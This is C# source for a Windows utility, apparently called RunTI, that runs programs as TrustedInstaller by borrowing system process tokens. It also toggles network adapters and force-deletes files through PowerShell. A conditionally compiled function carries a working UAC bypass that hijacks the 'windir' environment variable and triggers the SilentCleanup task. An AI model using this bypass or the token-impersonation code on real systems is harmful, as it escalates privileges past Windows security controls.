﻿using System;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace RunTI
{
    static class Program
    {
        // Prevent idiots to touch this executable
        static readonly FileStream thisExec = new FileStream(Application.ExecutablePath, FileMode.Open, FileAccess.Read);

        [STAThread]
        static void Main(string[] args)
        {

            if (args.Length == 0) {
                Console.WriteLine("No arguments, for more information use /help");
                return;
            }else if(args[0].ToLower() == "/help")
            {
                DisplayHelpMessage();
                return;
            }

            if (args.Length > 0)
            {
                for (int i = 0; i < args.Length; i++)
                {
                    string arg = args[i];

                    if (arg == "/DisableNetwork")
                    {
                        toggleAdapters(true);
                        return;
                    }

                    else if (arg == "/EnableNetwork")
                    {
                        toggleAdapters(false);
                        return;
                    }

                    if(arg == "/DestroyFileOrFolder")
                    {
                        var path = String.Join(" ", args).Replace("/DestroyFileOrFolder ", "");
                        DestroyFileOrFolder(path); 
                        return;
                    }
                }
            }
                
            void toggleAdapters(bool isDisabled = false)
            {
                toggleAdapter("Ethernet", isDisabled);
                toggleAdapter("Ethernet0", isDisabled);
            }

            void toggleAdapter(string interfaceName, bool isDisabled)
            {
                string status = isDisabled ? "disable" : "enable";
                try
                {
                    System.Diagnostics.ProcessStartInfo psi =
                       new System.Diagnostics.ProcessStartInfo
                       {
                           FileName = "netsh",
                           Arguments = String.Format("interface set interface \"{0}\" {1}", interfaceName, status),
                           UseShellExecute = false,
                           CreateNoWindow = true,
                           RedirectStandardOutput = true,
                       };
                    System.Diagnostics.Process p = new System.Diagnostics.Process();
                    p.StartInfo = psi;
                    p.Start();
                }
                catch { }
                
            }

#if UACB
            if (!(args.Length > 0))
            {
                Bypass();
                return;
            }
            else
            {
                //This exposes to 34987567834598345 bugs so don't use UACSkip pls
                List<string> b = new List<string>(args);
                var pos = b.IndexOf("/SwitchTI");
                if (pos == -1)
                    args = new string[0];
            }
#endif

            if (args.Length > 0 && args[0].ToLower() == "/switchti")
                ParseCmdLine(args);
            else
                LaunchWithParams(args);
        }

#if UACB
        static void Bypass()
        {
            Registry.CurrentUser.OpenSubKey("Environment", true).SetValue("windir", $"{Application.ExecutablePath} /bypass ", RegistryValueKind.String);

            var si = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                UseShellExecute = false,
                Arguments = @"/RUN /TN Microsoft\Windows\DiskCleanup\SilentCleanup /I"
            };

            var p = Process.Start(si);
            p.WaitForExit();

            Registry.CurrentUser.OpenSubKey("Environment", true).DeleteValue("windir");
        }
#endif

        static void DisplayHelpMessage()
        {
            Console.WriteLine("");
            Console.WriteLine("/EXEFilename\t\tName of the executable.");
            Console.WriteLine("/CommandLine\t\tArguments for the executable.");
            Console.WriteLine("/StartDirectory\t\tDirectory where the executable starts.");
            Console.WriteLine("/NoWindow\t\tStart the executable without any windows (useful for silent script running).");
            Console.WriteLine("");
            Console.WriteLine("/DisableNetwork\t\tDisable network connection.");
            Console.WriteLine("/EnableNetwork\t\tEnable network connection.");
            Console.WriteLine("");
            Console.WriteLine("/DestroyFileOrFolder\tDestroy file or folder without confirmation and without moving to recycle bin.");
        }

        static void LaunchWithParams(string[] args)
        {
            var exe = "cmd.exe";
            var arguments = "";
            var dirPath = "";
            var isWindow = true;

            if (args.Length > 0)
            {
                for (int i = 0; i < args.Length; i++)
                {
                    string arg = args[i];

                    if ((arg == "/EXEFilename"))
                    {
                        exe = args[++i];
                    }
                    if ((arg == "/CommandLine"))
                    {
                        arguments = args[++i];
                    }
                    if ((arg == "/StartDirectory"))
                    {
                        dirPath = args[++i];
                    }
                    if ((arg == "/NoWindow"))
                    {
                        isWindow = false;
                    }
                }

                // Support for running msc's like /EXEFilename (services.msc, gpedit.msc)
                if (exe.Split('.').Last() == "msc")
                {
                    arguments = $"/s {exe}";
                    exe = "mmc.exe";
                }
            }else
            {
                return; // exit without args
            }

            if (string.IsNullOrWhiteSpace(dirPath) || !Directory.Exists(dirPath.Replace("\"", "")))
            {
                try
                {
                    dirPath = Environment.CurrentDirectory;
                }
                catch (Exception)
                {
                    dirPath = "";
                }
            }

            string isWindowString = isWindow ? "" : " /NoWindow";

            if (StartTiService())
            {
                string command = $" /SwitchTI{isWindowString} /Dir:\"{dirPath.Replace(@"\", @"\\")}\\\" /Run:\"{exe}\" {arguments}";
                LegendaryTrustedInstaller.RunWithTokenOf("winlogon.exe", true, Application.ExecutablePath, command, isWindow);
            }
        }

        public static void DestroyFileOrFolder(string path)
        {
            bool isDirectory = Directory.Exists(path);
            bool isFile = File.Exists(path);

            string dirPath = "";
            if (string.IsNullOrWhiteSpace(dirPath) || !Directory.Exists(dirPath))
            {
                try
                {
                    dirPath = Environment.CurrentDirectory;
                }
                catch (Exception)
                {
                    dirPath = "";
                }
            }

            string exe = "powershell.exe";
            string arguments = $"-NoProfile -NoLogo -ExecutionPolicy Unrestricted -Command \"Remove-Item -Path " + @"\" + $"\"{path.TrimStart('"').TrimEnd('"')}" + @"\" + "\" -Force -ErrorAction SilentlyContinue\"";
            if (isDirectory)
            {
                arguments = $"-NoProfile -NoLogo -ExecutionPolicy Unrestricted -Command \"Remove-Item -Path " + @"\" + $"\"{path.TrimStart('"').TrimEnd('"')}" + @"\" + "\" -Recurse -Force -ErrorAction SilentlyContinue\"";
            }

            if (StartTiService())
            {
                string command = $" /SwitchTI /NoWindow /Dir:\"{dirPath.Replace(@"\", @"\\")}\\\" /Run:\"{exe}\" {arguments}";
                LegendaryTrustedInstaller.RunWithTokenOf("winlogon.exe", true, Application.ExecutablePath, command, false);
            }

        }

        static void ParseCmdLine(string[] args)
        {
            string ExeToRun = "", Arguments = "", WorkingDir = "", toRun = "";

            // args[] can't process DirPath and ExeToRun containing '\'
            // and that will influence the other argument too :(
            // so I need to do it myself :/
            string CmdLine = Environment.CommandLine;
            
            bool isWindow = CmdLine.ToLower().IndexOf("/nowindow") == -1;
            int iToRun = CmdLine.ToLower().IndexOf("/run:");
            if (iToRun != -1)
            {
                toRun = CmdLine.Substring(iToRun + 5).Trim();
                // Process toRun
                int iDQuote1, iDQuote2;
                iDQuote1 = toRun.IndexOf("\"");
                // If a pair of double quote is exist
                if (iDQuote1 != -1)
                {
                    toRun = toRun.Substring(iDQuote1 + 1);
                    iDQuote2 = toRun.IndexOf("\"");
                    if (iDQuote2 != -1)
                    {
                        // before 2nd double quote is ExeToRun, after is Arguments
                        ExeToRun = toRun.Substring(0, iDQuote2);
                        Arguments = toRun.Substring(iDQuote2 + 1);
                    }
                }
                else
                {
                    // before 1st Space is ExeToRun, after is Arguments
                    int firstSpace = toRun.IndexOf(" ");
                    if (firstSpace == -1) { ExeToRun = toRun; }
                    else
                    {
                        ExeToRun = toRun.Substring(0, firstSpace);
                        Arguments = toRun.Substring(firstSpace + 1);
                    }
                }
            }

            // Process all optional arguments before toRun, '/' as separator
            if (iToRun != -1)
                CmdLine = CmdLine.Substring(0, iToRun) + "/";

            string cmdline = CmdLine.ToLower();

            string tmp;

            int iDir, iNextSlash;

            iDir = cmdline.IndexOf("/dir:");
            if (iDir != -1)
            {
                tmp = CmdLine.Substring(iDir + 5);
                iNextSlash = tmp.IndexOf("/");
                if (iNextSlash != -1)
                {
                    tmp = tmp.Substring(0, iNextSlash);
                    WorkingDir = tmp.Replace("\"", "").Trim();
                }
            }

            LegendaryTrustedInstaller.ForceTokenUseActiveSessionID = true;
            LegendaryTrustedInstaller.RunWithTokenOf("TrustedInstaller.exe", false, ExeToRun, Arguments, isWindow, WorkingDir);
        }

        public static bool StartTiService()
        {
            try
            {
                NativeMethods.TryStartService("TrustedInstaller");
                return true;
            }
            catch (Exception)
            {
                //hmm....
                return false;
            }
        }
    }
}
